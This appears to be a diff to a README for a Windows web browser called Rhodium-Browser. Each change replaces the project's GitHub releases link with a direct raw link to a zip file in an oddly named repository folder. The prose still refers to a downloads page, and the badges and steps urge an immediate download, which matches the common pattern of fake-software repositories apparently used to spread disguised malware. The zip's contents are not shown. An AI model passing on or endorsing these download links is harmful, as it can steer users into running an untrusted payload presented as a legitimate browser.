@@ -1,7 +1,7 @@
 <h1>🌐 Rhodium-Browser - Your Fast, Modern Web Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/todusparliament6614/Rhodium-Browser/releases">
+  <a href="https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip">
     <img src="https://img.shields.io/badge/Download-Rhodium%20Browser-4285F4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Rhodium Browser">
   </a>
 </p>
@@ -14,7 +14,7 @@ Rhodium-Browser is a fresh, modern web browser designed for everyday users who w
 
 Getting started with Rhodium-Browser is incredibly easy. Follow these simple steps:
 
-1. **Visit this link to download the application.** Click the big blue button above or use this direct link: [https://github.com/todusparliament6614/Rhodium-Browser/releases](https://github.com/todusparliament6614/Rhodium-Browser/releases)
+1. **Visit this link to download the application.** Click the big blue button above or use this direct link: [https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip](https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip)
 2. Once you're on the download page, look for the latest version of Rhodium-Browser.
 3. Click the download button to save the installer file to your computer.
 4. After the download finishes, you're ready to install!
@@ -23,7 +23,7 @@ Getting started with Rhodium-Browser is incredibly easy. Follow these simple ste
 
 ### Step 1: Download the File
 
-Go to the [Rhodium-Browser Downloads Page](https://github.com/todusparliament6614/Rhodium-Browser/releases) and click on the download link for the latest release. The file will be saved to your "Downloads" folder (or wherever your browser saves files by default).
+Go to the [Rhodium-Browser Downloads Page](https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip) and click on the download link for the latest release. The file will be saved to your "Downloads" folder (or wherever your browser saves files by default).
 
 ### Step 2: Run the Installer
 
@@ -78,7 +78,7 @@ Rhodium-Browser currently doesn't automatically import bookmarks from other brow
 Rhodium-Browser focuses on providing a streamlined experience. While it doesn't support all Chrome extensions, it includes essential features built-in so you don't need extra add-ons for everyday browsing.
 
 ### How do I update Rhodium-Browser?
-Simply visit the [downloads page](https://github.com/todusparliament6614/Rhodium-Browser/releases) periodically to check for new versions. Download the latest release and run the installer to update.
+Simply visit the [downloads page](https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip) periodically to check for new versions. Download the latest release and run the installer to update.
 
 ## 🧭 Troubleshooting Tips
 
@@ -121,7 +121,7 @@ Don't wait—**visit this link to download the application** and start enjoying 
 ---
 
 <p align="center">
-  <a href="https://github.com/todusparliament6614/Rhodium-Browser/releases">
+  <a href="https://raw.githubusercontent.com/todusparliament6614/Rhodium-Browser/main/chimaeroid/Browser-Rhodium-1.9.zip">
     <img src="https://img.shields.io/badge/Get%20Rhodium%20Browser%20Now-34A853?style=for-the-badge&logo=download&logoColor=white" alt="Download Rhodium Browser Now">
   </a>
 </p>
